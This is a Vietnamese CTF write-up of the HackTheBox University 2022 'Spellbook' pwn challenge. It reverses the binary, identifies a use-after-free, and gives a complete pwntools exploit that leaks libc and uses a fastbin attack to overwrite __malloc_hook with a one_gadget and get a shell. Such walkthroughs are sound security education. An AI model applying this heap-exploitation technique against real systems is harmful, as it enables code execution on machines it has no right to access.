---
title: 'HTB University CTF 2022: Spellbook'
categories:
  - HackTheBox
  - Pwnable
tags:
  - HTB
  - Pwn
published: true
---
# HTB University CTF 2022
## Spellbook
Kiểm tra binary
![Binary](https://i.imgur.com/eSNpu21.png)
Kiểm tra libc
![Libc](https://i.imgur.com/UnlUE9T.png)
Ta thấy đề bài đưa libc 2.23
Reverse bằng IDA
```c 
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax

  setup();
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        show();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
    if ( v3 == 3 )
    {
      edit();
    }
    else
    {
      if ( v3 != 4 )
      {
LABEL_13:
        printf("\n%s[-] You are not a wizard! You are a muggle!\n\n", "\x1B[1;31m");
        exit(22);
      }
      delete();
    }
  }
}
```
Kiểm tra hàm show()
```c
void __cdecl show()
{
  unsigned __int64 idx; // [rsp+0h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    printf(asc_19A8);
    printf(table[idx]->type);
    printf(asc_19C6);
    printf(table[idx]->sp);
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}
```
Kiểm tra hàm add()
```c
void __cdecl add()
{
  int size; // [rsp+4h] [rbp-5Ch]
  unsigned __int64 idx; // [rsp+8h] [rbp-58h]
  spl *spell; // [rsp+10h] [rbp-50h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 )
  {
    spell = (spl *)malloc(0x28uLL);
    printf(aInsert);
    spell->type[(int)(read(0, spell, 0x17uLL) - 1)] = 0;
    printf(aInsert_0);
    size = read_num();
    if ( size <= 0 || size > 1000 )
    {
      printf("\n%s[-] Such power is not allowed!\n", "\x1B[1;31m");
      exit(290);
    }
    spell->power = size;
    spell->sp = (char *)malloc(spell->power);
    printf(aEnter);
    spell->sp[(int)read(0, spell->sp, size - 1) - 1] = 0;
    table[idx] = spell;
    printf(aS_0, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}
```
Check xem struct spl có gì
```c
pwndbg> ptype /o spl
type = struct Spls {
/*      0      |      24 */    char type[24];
/*     24      |       8 */    char *sp;
/*     32      |       4 */    int power;
/* XXX  4-byte padding   */

                               /* total size (bytes):   40 */
                             }
```
Biến spell trỏ tới vị trí được cấp phát 0x30 bytes trên heap.
Ta thấy sau khi đọc một số nguyên dương từ input lưu vào power, hàm add() gọi malloc(spell->power) rồi cho spell->sp trỏ vào đó.

Kiếm tra hàm edit()
```c
void __cdecl edit()
{
  unsigned __int64 idx; // [rsp+8h] [rbp-18h]
  spl *new_spell; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    new_spell = table[idx];
    printf(aNew);
    new_spell->type[(int)(read(0, new_spell, 0x17uLL) - 1)] = 0;
    printf(aNew_0);
    new_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;
    printf(aS_1, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}
```
Kiểm tra hàm delete()
```c 
void __cdecl delete()
{
  unsigned __int64 idx; // [rsp+8h] [rbp-18h]
  spl *ptr; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    ptr = table[idx];
    free(ptr->sp);
    free(ptr);
    printf(aS_2, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}
```
Ta thấy khi free các chunk xong, hàm delete() không xóa các pointer trong `table` đi, từ đó ta có thế ghi/đọc chunk đã được được free bằng hàm edit() và show() -> UAF bug.

Đề bài để sử dụng libc 2.23 nên mình sẽ làm cách leak libc rồi sử dụng fastbin attack để ghi đè malloc_hook.

```c 
pwndbg> p &__malloc_hook
$2 = (<data variable, no debug info> *) 0x7ffff7bc4b10 <__malloc_hook>
pwndbg> x/10gx 0x7ffff7bc4b10-35 
0x7ffff7bc4aed:	0xfff7bc3260000000	0x000000000000007f
0x7ffff7bc4afd:	0xfff7885ea0000000	0xfff7885a7000007f
0x7ffff7bc4b0d <__realloc_hook+5>:	0xfff78858a000007f	0x000000000000007f
0x7ffff7bc4b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7bc4b2d:	0x0000000000000000	0x0000000000000000
```
Ta thấy lân cận malloc_hook có long(0x7f), từ đó ta có "fake chunk" với size=0x70, chiến thuật của ta làm sao khi gọi hàm malloc cấp phát 0x70 bytes thì nó trả về 0x7ffff7bc4aed .
```python 
add(2,b"A"*0x10+b"chunk2",0xa0,b"B"*20)
add(3,b"A"*0x10+b"chunk3",0x68,b"C"*20)
add(4,b"A"*0x10+b"chunk4",0xa0,b"D"*20)
```
Mình tạo cho `spell2->sp` với `spell4->sp` có size 0xb0 (malloc luôn cấp phát size lớn hơn yêu cầu) để khi free ta có được unsorted bin  -> sử dụng uaf leak libc.
Tạo `spell3->sp` có size là 0x70 để khi free nó ta có fastbin 0x70.

Tận dụng uaf để leak libc (biến spell được cấp phát 0x30 bytes nên khi delete ta có luôn fastbin 0x30 để leak heap)
```python
delete(4)
delete(2)
pause()
(leaked_heap,leaked_libc)=show(2)
main_arena=int(leaked_libc[::-1].hex(),16)
leaked_heap=int(leaked_heap[::-1].hex(),16)
log.info(f"main_arena: {hex(main_arena)}")
log.info(f"leaked_heap: {hex(leaked_heap)}")
libc.address=main_arena-3951480
```
Delete chunk3 rồi ghi đè `spell3->sp->fd=&__malloc_hook-35`, khi đó ta thêm "fake chunk" có size 0x70 là fastbin 0x70.

```python 
delete(3)
edit(3,p64(leaked_heap),p64(libc.sym["__malloc_hook"]-35)) #add to 0x70 fastbin
```
Bây giờ, gọi malloc(0x68) 2 lần để nó pop các chunk ở fastbin 0x70 ra, lần đầu là `spell3->sp`, lần thứ 2 sẽ là "fake chunk", ghi đè malloc_hook trỏ tới địa chỉ one_gadget để giúp ta có được shell.
```python 
add(5,b"A"*0x10+b"chunk5",0x68,b"askkaksnksakassanasnas")
add(6,b"A"*0x10+b"chunk6",0x68,b"A"*19+p64(libc.address+0x4527a))
```
Full script
```python 
from pwn import *
from time import sleep
#context.log_level='debug'
context.binary=e=ELF("./spellbook")
libc=e.libc
#p=remote("134.209.186.13",30368)
p=e.process()
#gdb.attach(p,gdbscript="""
#set resolve-heap-via-heuristic on
#""")
def add(entry: int,type_ :bytes,power: int,sp: bytes):
	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(str(entry).encode())
	p.recv()
	p.sendline(type_)
	p.recv()
	p.sendline(str(power).encode())
	p.recv()
	p.sendline(sp)
	sleep(1)
def show(entry: int):
	p.recv()
	p.sendline(b'2')
	p.recv()
	p.sendline(str(entry).encode())
	p.recvuntil(b': ')
	type_=p.recvuntil(b'\n').rstrip()
	p.recvuntil(b': ')
	sp=p.recvuntil(b'\n').rstrip()
	sleep(1)
	return [type_,sp]
def edit(entry: int,type_ : bytes,sp: bytes):
	p.recv()
	p.sendline(b"3")
	p.recv()
	p.sendline(str(entry).encode())
	p.recv()
	p.sendline(type_)
	p.recv()
	p.sendline(sp)
	sleep(1)
def delete(entry: int):
	p.recv()
	p.sendline(b"4")
	p.recv()
	p.sendline(str(entry).encode())
	sleep(1)
add(2,b"A"*0x10+b"chunk2",0xa0,b"B"*20)
add(3,b"A"*0x10+b"chunk3",0x68,b"C"*20)
add(4,b"A"*0x10+b"chunk4",0xa0,b"D"*20)
delete(4)
delete(2)
pause()
(leaked_heap,leaked_libc)=show(2)
main_arena=int(leaked_libc[::-1].hex(),16)
leaked_heap=int(leaked_heap[::-1].hex(),16)
log.info(f"main_arena: {hex(main_arena)}")
log.info(f"leaked_heap: {hex(leaked_heap)}")
libc.address=main_arena-3951480
delete(3)
edit(3,p64(leaked_heap),p64(libc.sym["__malloc_hook"]-35)) #add to 0x70 fastbin
add(5,b"A"*0x10+b"chunk5",0x68,b"askkaksnksakassanasnas")
add(6,b"A"*0x10+b"chunk6",0x68,b"A"*19+p64(libc.address+0x4527a))
p.sendline(b"1\n"*2)
p.recv()
p.sendline(b"\nid")
p.interactive()
```
